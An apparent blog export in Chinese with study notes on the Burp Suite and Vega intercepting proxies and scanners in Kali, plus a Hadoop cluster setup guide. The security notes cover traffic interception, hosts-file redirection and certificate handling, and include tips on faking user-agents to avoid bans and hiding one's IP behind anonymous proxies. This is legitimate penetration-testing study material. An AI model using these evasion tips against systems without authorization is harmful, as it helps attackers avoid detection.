<li>所用的工具共享一个能处理并显示http消息的可扩展框架，模块之间无缝交换信息</li>
<li>portSwigger公司开发<a id="more"></a><ul>
<li>非开源</li>
<li>分为free版和professional版；</li>
<li>free版无主动扫描功能（但仍旧强大</li>
<li>kali中集成free版</li>
</ul>
</li>
<li>kali中默认安装有open版的Java，足以运行burp，但安装 oracle版Java会更好</li>
<li>改变字体可避免中文乱码，默认是英文，options-display</li>
</ul>
<h2 id="proxy模块"><a href="#proxy模块" class="headerlink" title="proxy模块"></a>proxy模块</h2><ul>
<li>其下标签简介<ul>
<li>intercept<ul>
<li>决定截断功能的开关</li>
<li>可以选择数据包的丢弃，继续发送等动作</li>
<li>action键，发往其它模块的</li>
</ul>
</li>
<li>http history<ul>
<li>http数据包的，历史纪录</li>
</ul>
</li>
<li>web sockets history<ul>
<li>有些请求没有http界面</li>
<li>如网页的API请求</li>
</ul>
</li>
<li>option<ul>
<li>设置监听地址和端口，默认8080端口和loopback本地环回地址（仅本机使用</li>
<li>也可以监听所有网卡，其他主机指定其IP作为代理服务器</li>
<li>request handling可以设置其抓取的流量发往指定的地址和端口，而不是原有的目标地址<ul>
<li>设置强制使用SSL连接，如下：</li>
<li>即使原与目标的通信是明文的http通信，设置后，经burp后与目标的通信会采用SSL加密的方式</li>
<li>设置不可见代理，如下：</li>
<li>如pc版的微信客户端，其与微信服务器的通信不使用浏览器，其通信仍基于http，但客户端程序并没有设置代理的功能；设置不可见代理便是为这种通信基于http但无法设置代理的程序</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>invisible不可见代理问题<ul>
<li>如pc版的微信客户端，其与微信服务器的通信不使用浏览器，其通信仍基于http，但客户端程序并没有设置代理的功能；设置不可见代理便是为这种通信基于http但无法设置代理的程序</li>
<li>但，客户端是没有代理功能的，可以利用dns域名解析解决：<ul>
<li>a主机上的微信客户端，b主机上的burp，<a href="http://xn--a-hg7am8fsufcrosxk.com" target="_blank" rel="noopener">微信服务器a.com</a></li>
<li>更改a主机的host文件，使微信服务器a.com的域名指向b主机，即a端的客户端程序的流量发向b端的burp</li>
<li>b端的burp作为中间人，可对流量进行修改，<a href="http://xn--a-228a6g474bzoooxp74a.com" target="_blank" rel="noopener">后发往真正的a.com</a></li>
<li>b端的burp收到来自a.com的响应后，再发往a端的客户程序</li>
<li>至此，截短代理完成</li>
</ul>
</li>
<li>但，往往微信客户端和burp是位于同一主机的，利用dns不可取，因为：<ul>
<li>因为客户端和burp在同一主机</li>
<li>burp将截获的流量发往真正目标服务器时，其解析的依然是本身</li>
<li>所以造成一个循环，流量最终发不到真正服务器</li>
</ul>
</li>
<li>利用，可解决上述问题，即客户端程序与burp位于同一主机的情况：<ul>
<li>位于options-connections-hostname resolution</li>
<li>添加主机解析记录</li>
<li>burp截取到客户端程序的流量，准备发送至真正服务器时</li>
<li>便不会依赖主机的host文件，而优先考虑此设置</li>
</ul>
</li>
<li>是否看主机头问题<ul>
<li>一般代理<ul>
<li>针对浏览器等能设置代理的</li>
<li>GET <a href="http://a.com/test.php" target="_blank" rel="noopener">http://a.com/test.php</a> http/1.1</li>
<li>host：<a href="http://a.com" target="_blank" rel="noopener">a.com</a></li>
<li>get的是绝对路径，不关注host字段</li>
</ul>
</li>
<li>不可见代理<ul>
<li>针对微信客户端等不支持代理设置的</li>
<li>GET /test.php http/1.1</li>
<li>host：<a href="http://a.com" target="_blank" rel="noopener">a.com</a></li>
<li>get的是相对路径，再发时会关注host头，拼接成完整地址</li>
</ul>
</li>
</ul>
</li>
<li>客户端程序发送的http请求无host头问题<ul>
<li>客户端时，需要看host头，与请求的页面拼接成最终目标地址</li>
<li>但是无host头，最终的拼接就会有问题</li>
<li>前期由客户端到burp时，通过dns欺骗即修改host文件，将目标域名的IP解析为burp所在主机</li>
<li>后期burp到真正目标时，proxy listeners-edit proxy-requests handing，添加redirect to host/port，将流量指向真正目标主机和端口</li>
</ul>
</li>
<li>客户端程序与其服务器通信设计多目标域名问题<ul>
<li>通常某程序通信时会涉及多个目标域名，<a href="http://xn--a-ch1b.xn--comb-221g.com" target="_blank" rel="noopener">如a.com和b.com</a></li>
<li>burp可以监听多个本地网卡，系统可以设置多个类似127.0.0.1的本地环回网卡</li>
<li>或者监听一个网卡，而监听多个端口，通过添加记录，每条记录都是一个proxy</li>
<li>如127:8081为proxy1，127:8082为proxy2</li>
<li>前期修改host文件，a.com指向8081端口，b.com指向8082端口，如此，实现客户端到burp的通信</li>
<li>后期，edit每条记录，即每个proxy，都选择invisable proxy，<a href="http://xn--8081a-r18ht70gls8a.com" target="_blank" rel="noopener">8081的指向a.com</a>，<a href="http://xn--8082b-r18ht70gls8a.com" target="_blank" rel="noopener">8082的指向b.com</a>，实现burp到真正服务器的通信（编辑redirect to host）</li>
</ul>
</li>
</ul>
</li>
<li>证书问题<ul>
<li>截断代理时，若目标是https，则浏览器会暴证书不可靠错误，影响后续操作</li>
<li>一种方法，浏览器导入burp的证书：proxy-option-proxy listener-CA certificate按键，导出至本地（选择第一个），再从本地导入至浏览器，即浏览器安装此证书</li>
<li>另一种方法：代理打开的情况下，浏览器访问<a href="http://burp，下载证书后，再导入（证书导入浏览器过程同上" target="_blank" rel="noopener">http://burp，下载证书后，再导入（证书导入浏览器过程同上</a></li>
</ul>
</li>
<li>截断相关<ul>
<li>注意截断和代理的区别，intercept is on控制截断的开关，关闭时，代理仍是开启状态，通过浏览器的通信仍走burp</li>
<li>截断打开的状态时，浏览器会暂时卡住，等待burp操作（drop丢弃，forward继续发送</li>
<li>默认proxy下的的截断，只会截断客户端到服务端方向的请求，而不会截断服务端到客户端的响应（repeater 模块下可实现</li>
<li>可在option中设置响应的截断，且可以编辑截断请求和响应时的规则，以及截断socket message时的设置</li>
<li>可以对响应进行截断并修改，response modification中，如擦除隐藏表单</li>
</ul>
</li>
<li>其它问题<ul>
<li>也可以对响应进行截断并修改，option标签中，response modification处</li>
<li>可以进行match and replace，提交数据时完成自动修改，option标签中，如设置替换UA头</li>
<li>http history中历史访问记录中，存在原始的访问请求，也存在经过修改的记录，除了request（origin request）和response，多了auto-modified request一栏</li>
</ul>
</li>
</ul>
<h2 id="target模块"><a href="#target模块" class="headerlink" title="target模块"></a>target模块</h2><ul>
<li>site map<ul>
<li>site map栏，可显示所访问的历史记录，层级化显示</li>
<li>黑色的表已实际访问的，灰色的指页面中存在，并未实际访问</li>
<li>对每条的访问记录可以进行高亮标识，也可用于filter</li>
<li>对每条访问记录，可以进行add comment，即添加注释，提前做好记录，日后方便查看（也可用于filter</li>
</ul>
</li>
<li>filter<ul>
<li>通过filter实现过滤功能，自行勾选选项（target模块中上方条栏</li>
</ul>
</li>
<li>scope<ul>
<li>可用scope进行过滤，同zap中scope概念类似</li>
<li>注意：排除掉logout页面</li>
</ul>
</li>
</ul>
<h2 id="spider模块"><a href="#spider模块" class="headerlink" title="spider模块"></a>spider模块</h2><ul>
<li>spider模块用于爬网，同其它工具，分为自动爬网和手动爬网</li>
<li>自动爬网<ul>
<li>sitemap中，右键，spider the host/branch（前者爬主机，后者爬某特定目录</li>
</ul>
</li>
<li>手动爬网<ul>
<li>开启代理，使流量通过burp</li>
<li>关闭截断，防止请求卡在burp，避免手动forward</li>
<li>手动点击web内各链接，过后，所有的访问出现在burp</li>
<li>spider模块可查看spider状态，target下可查看爬取记录</li>
</ul>
</li>
<li>spider-control<ul>
<li>显示spider状态</li>
<li>设置spider的开启或关闭</li>
<li>清空待爬取队列</li>
<li>scope设置，用于分组、过滤</li>
</ul>
</li>
<li>spider-option<ul>
<li>爬虫基本设置，爬取URL深底等</li>
<li>application login，有些页面需要进行身份认证，在此设置认证信息（使用向导或提前设置</li>
<li>requests header，请求头相关设置</li>
</ul>
</li>
<li>compare sitemap功能<ul>
<li>爬取完毕可以进行保存，菜单项：burp-save state</li>
<li>结果的保存很有意义：可以不同账号登录应用，以二者身份进行扫描爬取，对比二者所访问资源不同，从而发现应用在访问控制方面的不足（此缺陷不同于sql和xss等技术性漏洞，一般扫描工具不会发现，但burp提供对比二者结果来发现此问题的功能</li>
<li>target-site map，右键记录，compare site map，按向导设置，比较两次结果的差异</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>tool</tag>
        <tag>Kali</tag>
        <tag>Web渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali实战-Vega</title>
    <url>/2018/01/27/web/Kali%E5%AE%9E%E6%88%98-Vega/</url>
    <content><![CDATA[<h1 id="扫描工具之Vega"><a href="#扫描工具之Vega" class="headerlink" title="扫描工具之Vega"></a>扫描工具之Vega</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>Java编写，开源，web扫描器</li>
<li>图形化工具，不同于nikto纯命令行</li>
<li>工作模式<ul>
<li>扫描模式<ul>
<li>主动扫描</li>
<li>根据字典文件，可做fuzz测试</li>
<li>得目标的隐蔽目录<a id="more"></a></li>
</ul>
</li>
<li>代理模式<ul>
<li>代理截断，如burp</li>
<li>手动测试，较隐蔽，攻击不易被发现</li>
<li>得一般可见目录</li>
</ul>
</li>
<li>二者互有利弊，互补</li>
</ul>
</li>
<li>专注web application层面，而非web server和app server</li>
<li>可爬站，处理表单，做注入测试</li>
<li>支持SSL，https相关</li>
</ul>
<h2 id="常见设置"><a href="#常见设置" class="headerlink" title="常见设置"></a>常见设置</h2><ul>
<li>使用外部代理服务器<ul>
<li>socks代理<ul>
<li>如tor</li>
</ul>
</li>
<li>http代理<ul>
<li>如本机的goagent代理</li>
<li>上述是本机到Google的代理</li>
<li>尽管IP为127.0.0.1，实际连接远程Google代理</li>
</ul>
</li>
</ul>
</li>
<li>使用内部代理<ul>
<li>可选择覆盖原有ua头，也可使用原先代理的浏览器</li>
<li>设置useragent，伪装浏览器，ua头去掉Vega标示</li>
<li>可监听本机IP和本地端口，端口同浏览器设置的一致</li>
<li>也可以代理其他主机，填写其IP即可，得保证其能访问本机</li>
</ul>
</li>
<li>阻止浏览器和代理的缓存<ul>
<li>有缓存时客户端就不会新请求服务端</li>
<li>缓存在挖掘漏洞时会导致产生误判</li>
<li>阻止后，请求量加大</li>
</ul>
</li>
<li>扫描功能<ul>
<li>设置ua头，每次扫描请求时带上，伪造浏览器，防止被ban</li>
<li>扫描路径深度</li>
<li>扫描线程数等其他信息</li>
</ul>
</li>
<li>代理模式下也可使用扫描模块<ul>
<li>流量经过时同时进行测试</li>
<li>子主题</li>
</ul>
</li>
<li>添加目标范围，做一个分组，也可以设置exclude做排除，如排除logout页面</li>
</ul>
<h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><ul>
<li>代理功能<ul>
<li>监听浏览器指定端口，实现内部的代理</li>
<li>浏览器点击目标应用所有可见链接</li>
<li>Vega在接收到流量的同时浏览器的请求会照常发送，不同于burp会卡住</li>
<li>Vega显示所有点击过的链接，并根据页面内容的超链接得到进一步的页面url</li>
<li>手动点击新的url，来发现新的url，继续…</li>
<li>会发现大量网站页面，类似爬虫，但爬虫近会发现静态。</li>
<li>请求时浏览器发送的，Vega做提取url工作</li>
<li>代理同时启动扫描模块，通过数据分析，被动发现漏洞</li>
</ul>
</li>
<li>扫描功能<ul>
<li>由Vega向目标发送请求</li>
<li>定义目标scope，设置排除的页面如logout页面</li>
<li>选择要启动的扫描模块，一般选择全部开启，（同代理模式下的一样</li>
<li>可以设置认证登录信息<ul>
<li>粘贴cookie信息至此，实现认证</li>
<li>添加认证信息<ul>
<li>填写待认证的用户名</li>
<li>选择验证类型<ul>
<li>basic http</li>
<li>digest http</li>
<li>NTLM<ul>
<li>微软系统</li>
</ul>
</li>
<li>macro<ul>
<li>macro宏，可用于表单验证，比较常见</li>
</ul>
</li>
<li>前三针对web server类型的，macro针对application</li>
</ul>
</li>
<li>添加宏信息<ul>
<li>设置宏名字</li>
<li>add item，即登录时那个表单请求</li>
<li>编辑上述item，设置所需要的字段，如username和password</li>
<li>效果等同于手动登录页面</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>填写排除的扫描参数<ul>
<li>已知某参数不会有安全隐患时</li>
<li>可以减小扫描负担</li>
</ul>
</li>
</ul>
</li>
<li>重放功能<ul>
<li>对已经访问过的URL进行修改重放</li>
<li>修改http请求内容后重发</li>
</ul>
</li>
<li>截断功能<ul>
<li>截取到的流量不是直接发送到服务端</li>
<li>阻断在Vega，先在Vega下观察，修改</li>
<li>不同于之前的代理模块，浏览器访问的同时Vega也可以获取信息</li>
<li>同burp，Vega这方面有所欠缺，还是以burp为主</li>
</ul>
</li>
</ul>
<h2 id="支持SSL"><a href="#支持SSL" class="headerlink" title="支持SSL"></a>支持SSL</h2><ul>
<li>原理<ul>
<li>Vega也支持自签名证书，可看为一台服务器</li>
<li>使用代理模块时，本地浏览器-Vega，Vega-目标服务器，这两段都是https通信过程，前者利用Vega证书，后者是服务器证书</li>
<li>远程使用Vega<ul>
<li>除了本机使用Vega进行代理，也就是浏览器与Vega位于同一台主机，还可以远程使用Vega，此时远程服务器的身份验证就很重要。</li>
<li>若利用相关攻击手段，使VegaIP指向了危险Vega主机</li>
<li>则本机浏览器-危险Vega主机-目标服务器；</li>
<li>Vega充当了中间人，可实施中间人攻击</li>
</ul>
</li>
<li>避免基于Vega的中间人攻击<ul>
<li>本机浏览器安装正常的Vega证书</li>
<li>若出现危险提示，即证书不安全，则可能使用了危险Vega</li>
<li>正常情况下是不会有证书不安全等提示的</li>
<li>从而避免中间人攻击</li>
<li>前提是远程Vega，本地使用自然没有中间人威胁，出现安全提示时选择信任即可<ul>
<li>安装证书后的信任与强制选择信任是不同的</li>
<li>后者浏览器仍会显示警告，url左侧的⚠️</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>简单使用<ul>
<li>http：//vega/ca.crt 下载Vega证书并安装</li>
<li>前提是开启Vega代理，否则无法访问并下载</li>
<li>安装证书后的信任与强制选择信任是不同的</li>
<li>后者浏览器仍会显示警告，url左侧的⚠️</li>
</ul>
</li>
</ul>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li>安全学习的两个方法<ul>
<li>根据扫描器的请求，观察其请求链接，来学习</li>
<li>向黑帽子学习，蜜罐，学习其攻击手法</li>
</ul>
</li>
<li>注意目标的范围问题<ul>
<li>如上，代理模块时，会找到页面内容中存在的新的url链接</li>
<li>只是从内容中的超链接提取的，并不是真正访问的</li>
<li>范围控制不好，目标太多，工作量加大</li>
<li>由原先目标引出其他无关目标，没有得到授权，测试其他目标可能不合法</li>
</ul>
</li>
<li>代理相关<ul>
<li>Vega支持代理模式，内部代理<ul>
<li>Vega代理浏览器</li>
<li>都是同一机器，IP相同</li>
<li>目标可封杀IP，致使浏览器也无法访问</li>
</ul>
</li>
<li>Vega支持外部代理<ul>
<li>外部服务器代理本机</li>
<li>目标看到的IP是外网的代理服务器<ul>
<li>匿名代理最好，隐藏本机</li>
<li>透明代理无隐藏功能，目标依然可见本机IP</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>https相关<ul>
<li>相关知识<ul>
<li>公私钥<ul>
<li>公钥可公开，私钥自己所有</li>
<li>非对称加密；对称加密由同一密钥加解密</li>
<li>公钥加密，私钥解密；前者于锁，后者于钥匙</li>
<li>私钥的机密性是安全的根本</li>
</ul>
</li>
<li>访问速度<ul>
<li>相较http，前期多了证书和对称密钥的传递，必然会慢一点</li>
<li>两端传输信息时会有加解密</li>
</ul>
</li>
<li>三个大步骤<ul>
<li>1，证书的认证，进行身份验证，检查对方网站是否合法或者被篡改</li>
<li>2，身份验证通过后，进行对称密钥的传输</li>
<li>3，双方拥有同一对称秘钥后，开始进行加密通信</li>
</ul>
</li>
</ul>
</li>
<li>简单工作过程<ul>
<li>c第一次对s发起访问请求，s向c发送含有公钥的证书CA<ul>
<li>会涉及证书签名及认证</li>
<li>c端会有根证书，判断发送过来的CA是否是合法的</li>
</ul>
</li>
<li>c上会随机生成一个对称秘钥，其用于后续所有通信</li>
<li>c的对称秘钥不会直接传输到s，经上述的公钥加密后再传输</li>
<li>s收到密文时，用对应的私钥解密得到对称秘钥</li>
<li>c和s都拥有同一个对称秘钥，用于后续通信</li>
<li>关键点就是如何把c端的对称秘钥发送到服务端</li>
<li>其他<ul>
<li>每次的会话这个对称秘钥都是随机生成的</li>
<li>每一次通信结束后其就会失效，时间很短且加密强度高</li>
<li>加密强度高，破解时间长，即使解出也失效了</li>
</ul>
</li>
</ul>
</li>
<li>证书相关<ul>
<li>牵涉对称加密，非对称加密，hash算法等</li>
<li>服务器本身可以自签名证书，即自己颁发证书，但是没有第三方的认证，多见于小型站点</li>
<li>大型网站如百度，其证书都是由证书颁发机构颁发的，具有公信力<ul>
<li>证书是颁发到域名的而非IP地址</li>
<li>https访问一个IP时仍会报错，尽管此IP使用的域名的证书是合法的</li>
</ul>
</li>
<li>客户端浏览器是信任那些证书颁发机构的<ul>
<li>前提是浏览器安装有证书颁发机构的根证书</li>
<li>根证书里也含有颁发机构的公钥</li>
<li>即客户端浏览器持有证书颁发机构的公钥</li>
</ul>
</li>
<li>身份认证流程<ul>
<li>所颁发的证书都是由颁发机构所签名的</li>
<li>对证书内容进行hash计算</li>
<li>用根证书的私钥对哈希值进行加密</li>
<li>密文连同所颁发的证书等一起发给申请者</li>
<li>当c端请求s端，网站将证书及签名信息（即加密的哈希值）一同发给c</li>
<li>c端有颁发机构根证书的公钥，对密文解密得哈希值1</li>
<li>c对证书内容进行哈希计算，得到哈希值2</li>
<li>比较两个值，若相同则表明此证书是由颁发机构颁发的正规证书</li>
<li>是c对s网站的身份认证，表明目标网站是真实的</li>
</ul>
</li>
<li>身份认证的必要性<ul>
<li>小型站点采用自签名证书<ul>
<li>只是其证书未得到颁发机构信任</li>
<li>不会得到客户端信任，因此访问一些https网站时会询问是否信任</li>
<li>倘若信任，继续访问并不会影响后续的通信，而且后续通信也会加密处理，实现正常的https服务</li>
<li>证书仅仅提供身份验证功能，看目标网站是否被篡改</li>
<li>无论证书是证书颁发机构的还是自签名的，若客户端都选择信任其，则后续通信正常；证书的作用仅仅提供身份验证</li>
</ul>
</li>
<li>被攻击后，真假网站<ul>
<li>通过链路欺骗或者dns域名劫持等攻击手法</li>
<li>客户端误把IP指向了假网站</li>
<li>若真网站采用了https且其证书经过颁发机构颁发且认证</li>
<li>但是假网站证书是自签名的，得不到认证</li>
<li>客户访问的时候就会提示，避免客户因访问假网站而受到危害</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>tool</tag>
        <tag>Kali</tag>
        <tag>Web渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>大数据学习02_相关配置</title>
    <url>/2018/01/27/etc/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A002-%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h1 id="01-Hadoop-单机模式"><a href="#01-Hadoop-单机模式" class="headerlink" title="01-Hadoop_单机模式"></a>01-Hadoop_单机模式</h1><blockquote>
<p>VirtualBox+ Ubuntu_16</p>
</blockquote>
<h2 id="1-1-创建用户hadoop"><a href="#1-1-创建用户hadoop" class="headerlink" title="1.1-创建用户hadoop"></a>1.1-创建用户hadoop</h2><ul>
<li><p>为操作系统添加hadoop用户并设置密码</p>
</li>
<li><p>之后对Hadoop的操作均由hadoop用户完成</p>
</li>
<li><p>执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">useradd hadoop</span></span><br><span class="line"><span class="meta">$</span><span class="bash">passwd hadoop</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="1-2-下载安装JDK"><a href="#1-2-下载安装JDK" class="headerlink" title="1.2-下载安装JDK"></a>1.2-下载安装JDK</h2><a id="more"></a>
<ol>
<li><p>离线安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">cd</span> /home/hadoop/               </span></span><br><span class="line"><span class="meta">$</span><span class="bash">tar -zxvf jdk-7u75-linux-x64.tar.gz   </span></span><br><span class="line"><span class="meta">$</span><span class="bash">mv jdk1.7.0_75/ jdk1.7</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>配置JDK环境变量</p>
<ul>
<li><p>安装完jdk后，需要配置环境变量，把java变成系统内命令</p>
</li>
<li><p>编辑/etc/profile文件来修改系统环境变量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export JAVA_HOME=/home/ hadoop/ jdk1.7   </span><br><span class="line">export JRE_HOME=$JAVA_HOME/jre </span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin </span><br><span class="line">export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>使profile配置文件生效</p>
<p><code>source /etc/profile</code></p>
</li>
<li><p>检验JDK是否安装成功</p>
<p><code>java -version</code></p>
</li>
</ol>
<h2 id="1-3-hadoop安装配置"><a href="#1-3-hadoop安装配置" class="headerlink" title="1.3-hadoop安装配置"></a>1.3-hadoop安装配置</h2><ol>
<li><p>官网下载安装包后，执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">cd</span> /home/hadoop</span></span><br><span class="line"><span class="meta">$</span><span class="bash">tar -zxvf hadoop-2.6.0.tar.gz</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改Hadoop环境变量，/etc/profile</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export HADOOP_HOME=/home/hadoop/hadoop-2.6.0</span><br><span class="line">export PATH=$JAVA_HOME/bin:$JRE_HOME/bin:$HADOOP_HOME/sbin:$HADOOP_HOME/bin:$PATH</span><br><span class="line">export CLASSPATH=.:$JAVA_HOME/lib:$JRE_HOME/lib:$CLASSPATH:$HADOOP_HOME/share/hadoop/common/hadoop-common-2.6.0.jar:$HADOOP_HOME/share/hadoop/mapreduce/hadoop-mapreduce-client-core-2.6.0.jar:$HADOOP_HOME/share/hadoop/common/lib/commons-cli-1.2.jar</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>source /etc/profile</code>使配置生效</p>
</li>
<li><p>修改相关配置文件</p>
<ul>
<li><code>vim /home/hadoop/hadoop-2.6.0/etc/hadoop/hadoop-env.sh</code>，进入相应目录，编辑此文件</li>
<li>加入<code>export JAVA_HOME=/home/hadoop/jdk1.7</code></li>
</ul>
</li>
<li><p>检验hadoop可用性</p>
<p><code>hadoop</code>，无错误则安装配置成功</p>
</li>
</ol>
<h2 id="1-4-测试单机模式下的Hadoop"><a href="#1-4-测试单机模式下的Hadoop" class="headerlink" title="1.4-测试单机模式下的Hadoop"></a>1.4-测试单机模式下的Hadoop</h2><ul>
<li><p>其提供一个子项目hadoop-mapreduce-examples</p>
</li>
<li><p>查看其支持的功能</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">cd</span> /XXXX/hadoop-2.7.1/share/hadoop/mapreduce</span></span><br><span class="line">hadoop jar hadoop-mapreduce-examples</span><br><span class="line"><span class="meta">#</span><span class="bash"> hadoop +jar表示运行java程序</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>以计算圆周率的pi为例</p>
<p><code>hadoop jar hadoop-mapreduce-examples-2.7.1.jar pi 5 10</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.......</span><br><span class="line">.......</span><br><span class="line">Job Finished in 5.148 seconds</span><br><span class="line">Estimated value of Pi is 3.28000000000000000000</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="02-hadoop-集群安装部署"><a href="#02-hadoop-集群安装部署" class="headerlink" title="02-hadoop_集群安装部署"></a>02-hadoop_集群安装部署</h1><h2 id="2-1-克隆多个Ubuntu实例"><a href="#2-1-克隆多个Ubuntu实例" class="headerlink" title="2.1-克隆多个Ubuntu实例"></a>2.1-克隆多个Ubuntu实例</h2><ul>
<li>即复制Ubuntu的虚拟机，资源有限，在原有的基础上，再复制两个</li>
<li>最初的作为master，复制后为slave1和slave2</li>
</ul>
<h2 id="2-2-设置hostname"><a href="#2-2-设置hostname" class="headerlink" title="2.2-设置hostname"></a>2.2-设置hostname</h2><ul>
<li><code>vim /etc/hostname</code></li>
<li>分别更改为master，slave1，slave2</li>
<li>重启使系统生效，<code>shutdown -r now</code></li>
</ul>
<h2 id="2-3-设置虚拟机静态IP"><a href="#2-3-设置虚拟机静态IP" class="headerlink" title="2.3-设置虚拟机静态IP"></a>2.3-设置虚拟机静态IP</h2><ul>
<li><p><code>vim /etc/network/interfaces</code>，以下配置仅作参考，视本机网络环境而定</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto enp0s3</span><br><span class="line">iface enp0s3 inet static</span><br><span class="line">address 10.25.184.201</span><br><span class="line">netmask 255.255.255.128</span><br><span class="line">gateway 10.25.184.129</span><br><span class="line">dns-nameservers 202.102.128.68 202.102.134.68</span><br></pre></td></tr></table></figure>
</li>
<li><p>注意virtualbox的四种网络模式（图方便，直接设置桥接）</p>
<p>相关链接：<code>http://blog.csdn.net/shouldnotappearcalm/article/details/54933189</code></p>
</li>
<li><p>若联网失败，可能需要配置dns服务器，/etc/resolv.conf（可能需要）</p>
</li>
</ul>
<h2 id="2-4-设置hosts文件"><a href="#2-4-设置hosts文件" class="headerlink" title="2.4-设置hosts文件"></a>2.4-设置hosts文件</h2><ul>
<li><p>三台机子的hosts文件都是一样的</p>
</li>
<li><p><code>sudo vim /etc/hosts</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">10.25.184.200 master</span><br><span class="line">10.25.184.201 slave1</span><br><span class="line">10.25.184.202 slave2</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以配置一台后，利用scp拷贝到其他两台</p>
</li>
</ul>
<h2 id="2-5-配置ssh免密码登录"><a href="#2-5-配置ssh免密码登录" class="headerlink" title="2.5-配置ssh免密码登录"></a>2.5-配置ssh免密码登录</h2><ul>
<li><p>配置ssh免密码登录是让各节点能自动通过安全认证，不影响正常通讯</p>
</li>
<li><p>在线安装，<code>apt-get install ssh</code></p>
</li>
<li><p>查看ssh运行状态，<code>serrvice ssh status</code></p>
</li>
<li><p>无密码登录思路</p>
<ol>
<li>在每台机子上都使用ssh-keygen生成public key，private key</li>
<li>所有机子的public key都拷到一台机子如master上</li>
<li>在master上生成一个授权key文件authorized_keys</li>
<li>最后把authorized_keys拷给所有集群中的机子，就能保证无密码登录</li>
</ol>
</li>
<li><p>简要步骤</p>
<ol>
<li><p>先在master上，在当前用户目录下生成公钥、私钥对</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">cd</span> /home/hadoop</span></span><br><span class="line"><span class="meta">$</span><span class="bash">ssh-keygen -t rsa</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>将公钥文件内容导入至authorized_keys文件</p>
<p><code>cat .ssh/id_rsa.pub &gt;&gt; .ssh/authorized_keys</code></p>
</li>
<li><p>测试连接本机是否成功，<code>ssh master</code>，若不需要密码，则成功</p>
<ul>
<li>若仍需要密码，则检查authorized_keys文件权限，并做相应修改</li>
<li><code>exit</code>退出当前的ssh会话</li>
</ul>
</li>
</ol>
<blockquote>
<ul>
<li>常见问题及解决<ul>
<li>请先检查SSH服务是否启动，如果没启动，请启动</li>
<li>如果没有.ssh目录则创建一个</li>
<li>如无权限，使用命令修改要操作文件夹的owner为当前用户</li>
</ul>
</li>
</ul>
</blockquote>
<ol start="4">
<li><p>其它机器上生成公钥、密钥，并将公钥文件复制到master（以slave_1为例</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">ssh-keygen -t rsa</span></span><br><span class="line">scp  .ssh/id_rsa.pub   hadoop@master:/home/hadoop/id_rsa_1.pub</span><br></pre></td></tr></table></figure>
</li>
<li><p>此时，master上便得到了其他两主机的公钥文件，分别将其导入至authorized_keys</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">cat id_rsa_1.pub &gt;&gt; .ssh/authorized_keys</span></span><br><span class="line"><span class="meta">$</span><span class="bash">cat id_rsa_2.pub &gt;&gt; .ssh/authorized_keys</span></span><br></pre></td></tr></table></figure>
<p>这样，master这台机器上，就有所有3台机器的公钥了</p>
</li>
<li><p>将master上的“最全”公钥，复制到其它机器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">scp .ssh/authorized_keys  hadoop@slave1:/home/hadoop/.ssh/authorized_keys</span></span><br><span class="line"><span class="meta">$</span><span class="bash">scp .ssh/authorized_keys  hadoop@slave2:/home/hadoop/.ssh/authorized_keys</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>验证：每个虚拟机分别测试ssh登录其它，看是否需要密码<code>ssh master/slave1/slave2</code></p>
</li>
</ol>
</li>
<li><p>步骤小结：</p>
<ul>
<li>在各节点上生成公钥、私钥</li>
<li>将公钥发放其它所有节点</li>
</ul>
</li>
</ul>
